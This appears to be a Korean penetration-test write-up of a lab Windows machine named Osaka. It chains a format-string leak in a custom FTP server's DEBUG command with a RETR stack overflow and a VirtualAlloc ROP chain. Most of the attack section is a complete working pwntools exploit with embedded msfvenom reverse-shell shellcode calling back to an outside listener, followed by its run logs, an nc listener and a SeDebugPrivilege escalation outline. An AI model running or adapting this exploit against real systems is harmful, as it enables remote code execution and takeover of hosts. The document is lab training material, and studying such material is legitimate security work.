---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/pwn/bof
  - tech/pwn/format-string
  - tech/pwn/rop
  - tech/win/sedebugprivilege
  - tech/svc/ftp
  - tech/payload/msfvenom
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.243.20
ports: [21, 135, 139, 445, 3389, 5985, 47001]
services: [ftp, http, microsoft-ds, ms-wbt-server, msrpc, netbios-ssn]
status: solved
manual_tags: true
tech_count: 7
---

> [!info] 요약
> 타겟 `192.168.243.20` · Windows Server 2019(`OSAKA`, 10.0.17763.4252) · Advanced · 플래그 2/2
> 진입점: 21번 커스텀 "Simple FTP Server" → `admin:admin` 로그인 → 비표준 `DEBUG` 명령 포맷 스트링으로 이미지 베이스 릭(ASLR 우회) → `RETR` 인자 스택 오버플로우(EIP 오프셋 272) → `VirtualAlloc` ROP 체인(DEP 우회) → `shell_reverse_tcp` → `Wilson` 셸
> 권한상승: `whoami /priv` 에 `SeDebugPrivilege` Enabled → winlogon.exe(SYSTEM) 핸들 탈취 후 자식 프로세스 생성 → `nt authority\system`
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.243.20

### Initial Access – 커스텀 FTP 서비스의 DEBUG 포맷 스트링 정보유출과 RETR 스택 오버플로우를 체인해 ASLR·DEP 우회 원격 코드 실행

**Vulnerability Explanation:** 커스텀 "Simple FTP Server" 바이너리(21/tcp)에 취약점 두 개가 체인됨.
- 비표준 `DEBUG` 명령이 사용자 입력을 포맷 문자열 자리에 그대로 넘김(`printf(user_input)` 류) — `%x` 반복 전송 시 스택 프레임 잔재가 그대로 유출되는 포맷 스트링 취약점. 단독으로는 정보유출뿐, 코드 실행은 안 됨
- `RETR` 명령 인자가 길이 검사 없이 고정 크기 스택 버퍼로 복사됨 — `RETR ` 뒤 272바이트째부터 저장된 반환 주소(EIP)를 덮는 스택 버퍼 오버플로우. 단독으로는 ASLR 때문에 착지 주소를 하드코딩할 수 없음
- 포맷 스트링 릭으로 이미지 베이스를 구해 ASLR을 우회하고, 그 베이스로 계산한 `VirtualAlloc` ROP 체인으로 DEP(NX)까지 우회 — 릭과 오버플로우가 결합해야만 원격 코드 실행이 성립

**Vulnerability Fix:**
- 사용자 입력을 포맷 문자열 인자로 직접 넘기지 말 것(`printf("%s", input)` 형태로 고정). 컴파일 시 `-Wformat-security -Werror=format-security` 강제
- 길이 검사 없는 고정 버퍼 복사(`memcpy`/`strcpy` 류) 금지 — 파서 진입점에서 입력 길이를 먼저 검증
- 표준 FTP(RFC 959)에 없는 진단용 명령(`DEBUG`)을 운영 빌드에서 제거하거나 로컬 인터페이스로만 제한
- `/GS`(스택 쿠키) · `/guard:cf`(CFG) 컴파일 옵션 추가 — `/DYNAMICBASE`·`/NXCOMPAT` 적용과 `GUARD_CF` 부재는 PE 헤더 `DllCharacteristics=0x8140` 로 확인됨(`Initial Access` 재현 절). `/GS` 부재는 헤더로는 안 보이나 272바이트 패딩만으로 저장된 반환 주소가 그대로 덮여 제어가 넘어간 것이 근거

**Severity:** Critical — 무인증에 준하는 기본 자격증명으로 접근 후 원격 코드 실행, 즉시 로컬 사용자 셸 획득

**Steps to reproduce the attack:**
1. 21번 포트 `admin:admin` 으로 FTP 로그인
2. `DEBUG %x|%x|...`(100회) 전송 → 스택 값 유출 → 인덱스 0 값에서 `0x10f0` 을 빼 이미지 베이스 계산
3. `RETR` 인자에 `A×272` + ROP 체인(베이스 기준 상대 오프셋) + NOP + 셸코드 전송 → EIP 제어 → `VirtualAlloc` 으로 스택을 RWX 로 전환 → 셸코드 실행
4. 사전에 띄운 `nc -lvnp 443` 리스너로 `Wilson` 컨텍스트의 cmd.exe 리버스셸 수신

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.243.20 | TCP: 21, 135, 139, 445, 3389, 5985, 47001 |

```text
# Nmap 7.98 scan initiated Tue Aug 18 08:51:59 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.243.20
Nmap scan report for 192.168.243.20
Host is up (0.085s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp
| fingerprint-strings: 
|   GenericLines, NULL, SSLSessionReq: 
|_    220 Welcome to Simple FTP Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=osaka
| Not valid before: 2026-08-16T23:49:31
|_Not valid after:  2027-02-15T23:49:31
| rdp-ntlm-info: 
|   Target_Name: OSAKA
|   NetBIOS_Domain_Name: OSAKA
|   NetBIOS_Computer_Name: OSAKA
|   DNS_Domain_Name: osaka
|   DNS_Computer_Name: osaka
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-17T23:53:27+00:00
|_ssl-date: 2026-08-17T23:53:34+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.98%I=7%D=8/18%Time=6A839EB6%P=x86_64-pc-linux-gnu%r(NULL
SF:,22,"220\x20Welcome\x20to\x20Simple\x20FTP\x20Server\r\n")%r(GenericLin
SF:es,24,"220\x20Welcome\x20to\x20Simple\x20FTP\x20Server\r\n\r\n")%r(SSLS
SF:essionReq,24,"220\x20Welcome\x20to\x20Simple\x20FTP\x20Server\r\n\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=8/18%OT=21%CT=1%CU=34081%PV=Y%DS=4%DC=T%G=Y%TM=6A839F3
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=1
OS:04%GCD=1%ISR=10F%TI=I%CI=I%TS=U)SEQ(SP=107%GCD=1%ISR=107%TI=I%CI=I%TS=U)
OS:SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=FD%GCD=1%ISR=10C%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: Simple; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-17T23:53:27
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   84.72 ms 192.168.45.1
2   84.67 ms 192.168.45.254
3   85.37 ms 192.168.251.1
4   85.54 ms 192.168.243.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 18 08:54:30 2026 -- 1 IP address (1 host up) scanned in 151.61 seconds
```
— 출처: `~/PG/Osaka/nmap.log`

`nnmap` 은 오타가 아니라 `~/.zshrc:247` 의 별칭(`nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log`). 로그 첫 줄이 실행된 실제 커맨드라인을 그대로 담고 있음 — `/usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.243.20`. 별칭 그대로 실행됐음이 확인됨(이전 판의 "옵션이 붙어 있었다 [가정]" 서술을 이 실측으로 대체).

21번은 VERSION 칸이 비어 있고 `fingerprint-strings`·`1 service unrecognized` 블록이 뜸 — nmap 서비스 DB에 없는 커스텀 바이너리. `Service Info: Host: Simple` 은 nmap이 호스트명이 아니라 배너 `220 Welcome to Simple FTP Server` 의 `FTP Server` 앞 토큰을 정규식으로 캡처해 호스트 필드에 넣은 것 — 실제 호스트명은 `OSAKA`(rdp-ntlm-info 로 확인).

버전 판정 독립 근거 2개 — ① nmap `rdp-ntlm-info` 의 `Product_Version: 10.0.17763`, ② 이후 획득한 셸의 `Microsoft Windows [Version 10.0.17763.4252]`. 둘 다 Windows Server 2019 계열을 가리킴.

나머지 포트: 445(SMB)는 `Message signing enabled but not required`(서명 비강제, 워크그룹 환경이라 릴레이 대상 없음). 5985/47001은 `Microsoft-HTTPAPI/2.0` — 웹 애플리케이션이 아니라 WinRM(WSMan)의 HTTP 리스너. 49664–49670은 RPC 동적 포트로 정상.

### Initial Access – 포맷 스트링 릭 + 스택 BOF ROP 체인으로 FTP RCE

인증 확인 — `admin:admin` 으로 로그인 성공:

```python
p.sendline(b"USER admin")
p.recvuntil(b"331 User OK, password required")
p.sendline(b"PASS admin")
p.recvuntil(b"230 Login successful")
```

`admin:admin` 을 **어떻게** 얻었는지는 산출물에도 `~/.zsh_history` 에도 없음 — 기본 계정 추측(`admin:admin`·`anonymous:`)이나 배너 검색으로 보이나 확정 불가 [가정].

`DEBUG` 는 RFC 959에 없는 비표준 명령. 타겟에서 받은 파일은 둘 — `dev.txt`(29바이트, 내용은 한 줄 `This is a development server.`)과 `ftp.exe`(55,971바이트). 확보 경로는 `~/.zsh_history` 의 `ftp 192.168.243.20`(대화형 FTP 클라이언트 세션). 같은 히스토리에 `smbclient -L //192.168.243.20 -N` 도 있으나 `-L` 은 **공유 목록 나열**이라 파일 전송 근거가 되지 못하고, 전송용 `smbclient //<타겟>/<공유>` 호출은 히스토리에 없음. 세션 안에서 친 명령(`binary`·`get`)은 로그에 안 남음.

**`DEBUG` 를 무엇으로 찾았는지는 산출물로 재구성되지 않음 [가정].** 회수된 `ftp.exe` 로는 불가능함이 실측으로 확인됨 — 문자열 리터럴이 들어 있는 `.rdata` 섹션의 raw 시작이 117,760바이트인데 파일이 55,971바이트에서 끊겨 그 구간이 통째로 없고, `strings -a ftp.exe` 에 `ftp`·`user`·`pass`·`debug`·`retr` 이 **0건**임. 후보는 `dev.txt` 의 "development server" 힌트 · `HELP` 응답 열거 · 손상 전 온전한 사본에서의 문자열 추출이나, 어느 것도 로그에 남지 않음. 회수된 `ftp.exe` 의 손상 내역은 바로 다음 경고 블록.

> [!warning] `ftp.exe` 손상 — 헤더가 요구하는 크기의 35%만 남아 있음
> PE 섹션 테이블(`.text`·`.rdata`·`.data`·`.rsrc`·`.reloc`)이 요구하는 파일 크기를 직접 계산하면 158,208바이트인데, 실제 파일은 55,971바이트 — 102,237바이트(65%) 부족.
> DOS 스텁 구간에서 1바이트가 빠져 `PE\0\0` 시그니처가 `e_lfanew`가 가리키는 `0x100`이 아니라 `0xff`에서 시작하는 것도 재확인됨 — 그래서 `file ftp.exe` 가 `PE32 executable` 이 아니라 `MS-DOS executable, MZ for MS-DOS` 로 답함. 이 1바이트 밀림은 FTP `ascii` 모드 CRLF 변환과 모양이 같으나, 102KB 규모의 결손은 CRLF 스트리핑(수십~수백 바이트 단위)으로는 나올 수 없음. **전송이 중간에 끊긴 쪽(truncation)이 더 유력하나 원인은 확정 불가 [가정].**
> 다만 PE/Optional 헤더는 파일 앞부분(≈0x180바이트)에 있어 손상 이후 구간과 무관하게 그대로 파싱됨 — `Machine=0x14c`(i386) · `ImageBase=0x400000` · `DllCharacteristics=0x8140`(`DYNAMIC_BASE`+`NX_COMPAT`, `GUARD_CF` 없음) · `Characteristics=0x102`(`IMAGE_FILE_RELOCS_STRIPPED` 아님) 를 직접 파싱해 재확인함 — Vulnerability Fix 항목의 근거.
> ROP 가젯 오프셋은 이 손상된 정적 카피에서 나온 값이 아님 — 이어지는 ROP 체인 코드블록은 실행 중 로드된 이미지(베이스는 포맷 스트링 릭으로 실시간 계산) 기준이고, 정적 파일로는 어차피 검증 불가.

`DEBUG` 명령에 `%x` 100개를 보내 스택 값을 유출:

```python
p.sendline(b"DEBUG " + b"%x|" * 100)
```

응답(`~/PG/Osaka/exploit.py` 실행 로그):

```text
b'DEBUG 12d10f0|546b8|54438|0|6fec24|55424544|32312047|66303164|34357c30|...'
```

인덱스별 값:

| 인덱스 | 값 | 정체 |
|---|---|---|
| 0 | `0x12d10f0` | 실행 이미지 내부 포인터 — 익스플로잇이 쓰는 값 |
| 1 | `0x546b8` | 스택/힙 잔재 |
| 2 | `0x54438` | 스택/힙 잔재 |
| 3 | `0x0` | 널 |
| 4 | `0x6fec24` | 쓰이지 않음 |
| 5 | `0x55424544` | 리틀엔디언 `"DEBU"` — 이 지점부터 응답 자신의 출력 버퍼를 재귀적으로 읽음(`"DEBU"`→`"G 12"`→`"d10f"`→`"0|54"` = `DEBUG 12d10f0|54...`) |

인덱스 5부터 값이 ASCII 범위(0x20~0x7E)에 몰리는 것이 진짜 스택 포인터 구간의 끝을 가리킴 — 그 앞 4~5개만 유효한 포인터.

베이스 역산:

```python
leak_pie = int(leak[0], 16)
leak_ntdll = int(leak[4], 16)
bin_base = leak_pie - 0x10f0
```
— 출처: `~/PG/Osaka/exploit.py`

이 실행에서 `leak_pie = 0x012d10f0` → `bin_base = 0x012d0000`. `leak_ntdll` 은 대입만 되고 이후 쓰이지 않음.

Windows PE는 64KB 할당 단위 경계에 로드돼 이미지 베이스 하위 16비트가 항상 0 — 계산된 `0x012d0000` 이 `0000`으로 끝나 검산됨. `0x10f0` 은 릭 값에서 베이스를 뺀 RVA(오프셋)이고, 익스플로잇을 실제로 성공시켜 확인된 상수.

`RETR` 인자 스택 오버플로우 — 전송 패킷 헥사덤프로 EIP 오프셋 확정:

```text
00000110  41 41 41 41  41 45 e1 2d  01 45 e1 2d  01 a9 d5 2e  │AAAA│AE·-│·E·-│···.│
```

`RETR ` 5바이트 뒤 `A`가 `0x05`~`0x114`(272바이트), `0x115`부터 첫 ROP 가젯 `45 e1 2d 01`(리틀엔디언 `0x012de145`) 시작 — EIP 오프셋 272바이트.

ASLR·DEP 이중 완화:

| 완화 기능 | 우회 방법 |
|---|---|
| ASLR | 포맷 스트링 릭으로 베이스를 실행 시점에 계산, 모든 가젯 주소를 `+ bin_base` |
| DEP(NX) | ROP로 `VirtualAlloc` 호출 → 스택 영역을 RWX로 커밋 후 셸코드 진입 |

ROP 체인(mona.py `!mona rop -m <module>` 표준 `VirtualAlloc` 형):

```python
rop_gadgets = [
    # Setting up the registers for VirtualAlloc
    0xe145 + bin_base,  # POP EBP # RETN
    0xe145 + bin_base,  # Skip 4 bytes
    0x1d5a9 + bin_base, # POP EBX # RETN
    0x1,                # EBX = 1
    0x1bd7e + bin_base, # POP EDX # RETN
    0x1000,             # EDX = 0x1000 (size)
    0x11a2b + bin_base, # POP ECX # RETN
    0x40,               # ECX = 0x40 (executable permissions)
    0x4667 + bin_base,  # POP EDI # RETN
    0x4682 + bin_base,  # RETN (ROP NOP)
    0x1dff + bin_base,  # POP ESI # RETN
    0x14adb + bin_base, # JMP [EAX]
    0x1d2bf + bin_base, # POP EAX # RETN
    0x1e008 + bin_base, # Pointer to VirtualAlloc()
    0x10d6 + bin_base,  # PUSHAD # RETN
    0x10da + bin_base,  # JMP ESP
]
```

`VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)` 호출 프레임을 `PUSHAD`(EAX→ECX→EDX→EBX→ESP→EBP→ESI→EDI 순 푸시) 한 번으로 조립하는 mona 표준 트릭 — 레지스터를 미리 채워 두면 `PUSHAD` 뒤 스택이 그대로 함수 인자 배치가 됨. `exploit.py` 원본 주석 `# EDX = 0x1000 (size)` 는 오기 — 실제로 `0x1000`은 `MEM_COMMIT` 플래그이고 크기 인자는 `EBX = 1`(1을 넘겨도 커널이 페이지 단위로 올려 4096바이트가 커밋됨). 값 배치 자체는 정확해 익스플로잇 동작에는 영향 없음.

msfvenom 셸코드 생성:

```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.45.207 LPORT=443 -f py -v sc -o shellcode.txt
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of py file: 1576 bytes
Saved as: shellcode.txt
```
— 출처: `~/PG/Osaka/shellcode.txt`

인코더 없이 생성(`No encoder specified`). `~/.zsh_history` 에는 처음 `-b "\x00"`(널 배드캐릭터 제외)로 두 번 시도한 뒤 배드캐릭터 제외 없는 버전으로 바꿔 최종 채택한 이력이 남아 있음 — 이유는 산출물에 없음. 결과적으로 셸코드 324바이트 안의 `\x00` 12개·`\x0d` 2개·`\x0a` 1개가 전부 온전히 전달돼 셸이 떨어졌음(실행 로그의 전송 패킷 헥사덤프에서 확인) — 파서가 문자열이 아니라 길이 기반(`recv`가 반환한 길이만큼 `memcpy`)으로 인자를 복사한다는 증거.

버퍼 레이아웃:

| 구간 | 길이 | 역할 |
|---|---|---|
| `A` 패딩 | 272 | 지역 버퍼 + 저장된 EBP를 채우고 EIP 직전까지 도달 |
| ROP 체인 | 64 | EIP부터 시작 |
| NOP 슬레드 `\x90` | 16 | `VirtualAlloc` 반환 후 `JMP ESP` 착지점 여유(`assert` 로 총 길이 1000 고정, NOP 개수로 조절) |
| 셸코드 | 324 | `shell_reverse_tcp` |
| `C` 패딩 | 324 | 총 길이를 1000으로 맞춤 |

전체 익스플로잇:

```python
from pwn import *

sc =  b""
sc += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
sc += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
sc += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
sc += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
sc += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
sc += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
sc += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
sc += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
sc += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
sc += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
sc += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
sc += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
sc += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
sc += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
sc += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
sc += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
sc += b"\x2d\xcf\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
sc += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
sc += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
sc += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
sc += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
sc += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
sc += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
sc += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
sc += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
sc += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
sc += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

p = remote('192.168.243.20', 21, level='debug')
p.recvuntil(b"220 Welcome to Simple FTP Server")
p.sendline(b"USER admin")
p.recvuntil(b"331 User OK, password required")
p.sendline(b"PASS admin")
p.recvuntil(b"230 Login successful")

# Leak Base Address for ROP
p.sendline(b"DEBUG " + b"%x|" * 100)
leak = p.recvlines(numlines=2)[-1][6:]
leak = leak.split(b"|")
leak_pie = int(leak[0], 16)
leak_ntdll = int(leak[4], 16)
bin_base = leak_pie - 0x10f0
print(f"Binary Base:   {hex(bin_base)}")

total = 1000
rop_gadgets = [
    # Setting up the registers for VirtualAlloc
    0xe145 + bin_base,  # POP EBP # RETN
    0xe145 + bin_base,  # Skip 4 bytes
    0x1d5a9 + bin_base, # POP EBX # RETN
    0x1,                # EBX = 1
    0x1bd7e + bin_base, # POP EDX # RETN
    0x1000,             # EDX = 0x1000 (size)
    0x11a2b + bin_base, # POP ECX # RETN
    0x40,               # ECX = 0x40 (executable permissions)
    0x4667 + bin_base,  # POP EDI # RETN
    0x4682 + bin_base,  # RETN (ROP NOP)
    0x1dff + bin_base,  # POP ESI # RETN
    0x14adb + bin_base, # JMP [EAX]
    0x1d2bf + bin_base, # POP EAX # RETN
    0x1e008 + bin_base, # Pointer to VirtualAlloc()
    0x10d6 + bin_base,  # PUSHAD # RETN
    0x10da + bin_base,  # JMP ESP
]
rop = b""
for gadget in rop_gadgets:
    rop += p32(gadget)

print("Press any key to send")
input()

buf  = b""
buf += b"A" * (268 + 4)
buf += rop
buf += b"\x90" * 16        # real NOP sled
buf += sc
buf += b"C" * (total - len(buf))
assert len(buf) == total, f"buf len {len(buf)} != {total} (NOP 개수로 조절)"

p.send(b"RETR " + buf + b"\r\n")
p.interactive()
```
— 출처: `~/PG/Osaka/exploit.py`

`p.recvlines(numlines=2)[-1]` — `recvuntil(b"230 Login successful")` 이 뒤따르는 `\r\n`을 소비하지 않아 첫 줄이 잔여 개행이라 두 번째 줄을 집음. `p.send(... + b"\r\n")`(`sendline` 아님) — FTP 정식 종결자 `\r\n`을 마지막 결정 패킷에서만 명시적으로 붙임.

실행:

```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ python exploit.py
[+] Opening connection to 192.168.243.20 on port 21: Done
[DEBUG] Received 0x22 bytes:
    b'220 Welcome to Simple FTP Server\r\n'
[DEBUG] Sent 0xb bytes:
    b'USER admin\n'
[DEBUG] Received 0x20 bytes:
    b'331 User OK, password required\r\n'
[DEBUG] Sent 0xb bytes:
    b'PASS admin\n'
[DEBUG] Received 0x16 bytes:
    b'230 Login successful\r\n'
[DEBUG] Sent 0x133 bytes:
    b'DEBUG %x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|\n'
[DEBUG] Received 0x37d bytes:
    b'DEBUG 12d10f0|546b8|54438|0|6fec24|55424544|32312047|66303164|34357c30|7c386236|33343435|7c307c38|63656636|357c3432|34323435|7c343435|31333233|37343032|3336367c|36313330|34337c34|63373533|377c3033|36383363|7c363332|34333333|35333433|3363377c|33633730|33367c38|36363536|337c3633|33633735|7c323334|32333433|35333433|3363377c|33343334|31337c35|32333333|337c3333|33343337|7c323330|36333333|63373633|3336337c|33333331|34337c30|63373333|367c3433|33373333|7c333335|63373733|33333033|3336337c|36333338|63377c33|33333633|337c3233|33333334|7c333333|33333533|33333433|3633337c|37373333|33337c63|37333336|337c3033|37363333|7c383363|36333633|36333533|3733337c|33363363|33337c33|37333336|377c3533|33323363|7c343333|33333233|33333433|3335337c|33343333|33337c33|37333336|337c6337|33343333|7c343333|33333133|35336337|3332337c|33333333|33337c33|33336337|337c3333|33343333|7c373333|32336337|30333333|3336337c|\n'
    b'\r\n'
Binary Base:   0x12d0000
Press any key to send

[DEBUG] Sent 0x3ef bytes:
    00000000  52 45 54 52  20 41 41 41  41 41 41 41  41 41 41 41  │RETR│ AAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000110  41 41 41 41  41 45 e1 2d  01 45 e1 2d  01 a9 d5 2e  │AAAA│AE·-│·E·-│···.│
    00000120  01 01 00 00  00 7e bd 2e  01 00 10 00  00 2b 1a 2e  │····│·~·.│····│·+·.│
    00000130  01 40 00 00  00 67 46 2d  01 82 46 2d  01 ff 1d 2d  │·@··│·gF-│··F-│···-│
    00000140  01 db 4a 2e  01 bf d2 2e  01 08 e0 2e  01 d6 10 2d  │··J.│···.│···.│···-│
    00000150  01 da 10 2d  01 90 90 90  90 90 90 90  90 90 90 90  │···-│····│····│····│
    00000160  90 90 90 90  90 fc e8 82  00 00 00 60  89 e5 31 c0  │····│····│···`│··1·│
    00000170  64 8b 50 30  8b 52 0c 8b  52 14 8b 72  28 0f b7 4a  │d·P0│·R··│R··r│(··J│
    00000180  26 31 ff ac  3c 61 7c 02  2c 20 c1 cf  0d 01 c7 e2  │&1··│<a|·│, ··│····│
    00000190  f2 52 57 8b  52 10 8b 4a  3c 8b 4c 11  78 e3 48 01  │·RW·│R··J│<·L·│x·H·│
    000001a0  d1 51 8b 59  20 01 d3 8b  49 18 e3 3a  49 8b 34 8b  │·Q·Y│ ···│I··:│I·4·│
    000001b0  01 d6 31 ff  ac c1 cf 0d  01 c7 38 e0  75 f6 03 7d  │··1·│····│··8·│u··}│
    000001c0  f8 3b 7d 24  75 e4 58 8b  58 24 01 d3  66 8b 0c 4b  │·;}$│u·X·│X$··│f··K│
    000001d0  8b 58 1c 01  d3 8b 04 8b  01 d0 89 44  24 24 5b 5b  │·X··│····│···D│$$[[│
    000001e0  61 59 5a 51  ff e0 5f 5f  5a 8b 12 eb  8d 5d 68 33  │aYZQ│··__│Z···│·]h3│
    000001f0  32 00 00 68  77 73 32 5f  54 68 4c 77  26 07 ff d5  │2··h│ws2_│ThLw│&···│
    00000200  b8 90 01 00  00 29 c4 54  50 68 29 80  6b 00 ff d5  │····│·)·T│Ph)·│k···│
    00000210  50 50 50 50  40 50 40 50  68 ea 0f df  e0 ff d5 97  │PPPP│@P@P│h···│····│
    00000220  6a 05 68 c0  a8 2d cf 68  02 00 01 bb  89 e6 6a 10  │j·h·│·-·h│····│··j·│
    00000230  56 57 68 99  a5 74 61 ff  d5 85 c0 74  0c ff 4e 08  │VWh·│·ta·│···t│··N·│
    00000240  75 ec 68 f0  b5 a2 56 ff  d5 68 63 6d  64 00 89 e3  │u·h·│··V·│·hcm│d···│
    00000250  57 57 57 31  f6 6a 12 59  56 e2 fd 66  c7 44 24 3c  │WWW1│·j·Y│V··f│·D$<│
    00000260  01 01 8d 44  24 10 c6 00  44 54 50 56  56 56 46 56  │···D│$···│DTPV│VVFV│
    00000270  4e 56 56 53  56 68 79 cc  3f 86 ff d5  89 e0 4e 56  │NVVS│Vhy·│?···│··NV│
    00000280  46 ff 30 68  08 87 1d 60  ff d5 bb f0  b5 a2 56 68  │F·0h│···`│····│··Vh│
    00000290  a6 95 bd 9d  ff d5 3c 06  7c 0a 80 fb  e0 75 05 bb  │····│··<·│|···│·u··│
    000002a0  47 13 72 6f  6a 00 53 ff  d5 43 43 43  43 43 43 43  │G·ro│j·S·│·CCC│CCCC│
    000002b0  43 43 43 43  43 43 43 43  43 43 43 43  43 43 43 43  │CCCC│CCCC│CCCC│CCCC│
    *
    000003e0  43 43 43 43  43 43 43 43  43 43 43 43  43 0d 0a     │CCCC│CCCC│CCCC│C··│
    000003ef
[*] Switching to interactive mode

$
```
— 출처: `~/PG/Osaka/exploit.py` 실행 로그(파일명 개별 저장 없음, 노트 원문 기록)

`$` 프롬프트는 셸이 아니라 pwntools의 interactive 프롬프트 — 리버스셸은 별도로 미리 띄운 `nc -lvnp 443` 리스너로 들어옴.

```bash
C:\Users\Wilson\Desktop>type local.txt
type local.txt
1626da9ca8660f809d1df31fa797af30

C:\Users\Wilson\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.243.20
